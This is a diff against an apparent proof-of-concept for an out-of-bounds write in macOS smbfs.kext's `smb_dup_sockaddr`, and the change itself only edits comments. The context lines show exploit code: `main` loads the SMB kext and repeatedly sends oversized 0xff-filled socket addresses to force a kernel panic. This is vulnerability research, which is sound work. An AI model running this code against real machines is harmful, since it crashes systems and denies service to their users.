@@ -16,7 +16,7 @@
 
 ///
 /// The method `smb_dup_sockaddr` is used in `smbfs.kext` to duplicate a socket address. This
-/// method allocates a memory of size `sizeof(struct sockaddr_nb)` and type `M_SONAME` and
+/// method allocates a memory of size `sizeof(struct sockaddr_nb)` from `default.64` zone and
 /// copies `sa_len` bytes from socket address to allocated memory as shown below:
 ///
 /// struct sockaddr *
@@ -41,6 +41,8 @@
 ///
 /// As noted above in the code snippet, an OOB write in default.64 zone occurs when the length
 /// of input socket address (`sa_len`) is greater than 64.
+///
+/// See PoC below for more details.
 ///
 ///
 
@@ -108,11 +110,11 @@ int overflow_zone_kext_kalloc_64(char* overflow_data, uint overflow_size) {
 int main(int argc, const char * argv[]) {
     smb_client_load_kext();
 
-    /// Maximum length overflow to trigger kernel panic as soon as possible
+    /// Using maximum overflow size to trigger kernel panic as soon as possible
     uint overflow_size = UINT8_MAX - 64;
     char overflow_data[overflow_size];
     
-    /// Will help in triggering zone element modifier after free panic
+    /// Will help in triggering zone element modified after free panic
     memset(overflow_data, 0xff, sizeof(overflow_data));
 
     for (int i=0; i<1000; i++) {
